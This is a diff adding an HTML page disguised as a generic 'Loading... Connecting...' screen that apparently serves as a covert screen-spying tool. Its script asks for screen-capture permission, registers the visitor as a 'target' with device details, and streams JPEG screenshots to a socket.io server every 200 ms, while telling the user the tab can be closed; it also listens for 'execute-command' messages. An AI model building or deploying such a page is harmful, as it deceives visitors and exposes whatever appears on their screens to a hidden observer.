@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; background:#000; color:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; }
+.container { max-width:500px; width:100%; padding:20px; text-align:center; }
+.logo { font-size:48px; margin-bottom:20px; animation:pulse 2s infinite; }
+@keyframes pulse { 0%,100% { transform:scale(1); } 50% { transform:scale(1.1); } }
+.status { font-size:14px; color:#888; margin:10px 0; }
+#error { background:#f44336; color:#fff; padding:15px; border-radius:10px; margin-top:20px; display:none; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">📱</div>
+  <h2 style="margin-bottom:10px;">Connecting...</h2>
+  <div class="status" id="status">Initializing...</div>
+  <div id="error"></div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const sessionId = window.location.pathname.split('/')[2];
+const socket = io();
+
+function log(msg) {
+  document.getElementById('status').textContent = msg;
+  console.log(msg);
+}
+
+function showError(msg) {
+  document.getElementById('error').textContent = msg;
+  document.getElementById('error').style.display = 'block';
+}
+
+async function initCapture() {
+  try {
+    log('Requesting screen access...');
+
+    const stream = await navigator.mediaDevices.getDisplayMedia({
+      video: {
+        width: { ideal: 1920 },
+        height: { ideal: 1080 },
+        frameRate: { ideal: 20 }
+      },
+      audio: false
+    });
+
+    log('Screen access granted');
+
+    const deviceInfo = {
+      platform: navigator.platform,
+      userAgent: navigator.userAgent.substr(0, 100),
+      width: screen.width,
+      height: screen.height
+    };
+
+    socket.emit('register-target', { sessionId, deviceInfo });
+
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+
+    video.onloadedmetadata = () => {
+      canvas.width = video.videoWidth || 1280;
+      canvas.height = video.videoHeight || 720;
+
+      log('Streaming active - You can close this tab now');
+      document.body.style.background = '#4caf50';
+
+      setInterval(() => {
+        if (video.readyState >= 2) {
+          ctx.drawImage(video, 0, 0);
+          socket.emit('screen-frame', canvas.toDataURL('image/jpeg', 0.5));
+        }
+      }, 200);
+    };
+
+    stream.getTracks()[0].onended = () => {
+      log('Stream ended');
+      socket.disconnect();
+    };
+
+  } catch(e) {
+    showError('Error: ' + e.message + '\n\nBrowser may not support screen capture.');
+    log('Failed: ' + e.message);
+  }
+}
+
+socket.on('connect', () => {
+  log('Connected to server');
+  setTimeout(initCapture, 1000);
+});
+
+socket.on('disconnect', () => {
+  log('Disconnected');
+});
+
+socket.on('execute-command', (cmd) => {
+  console.log('Command received:', cmd);
+});
+</script>
+</body>
+</html>
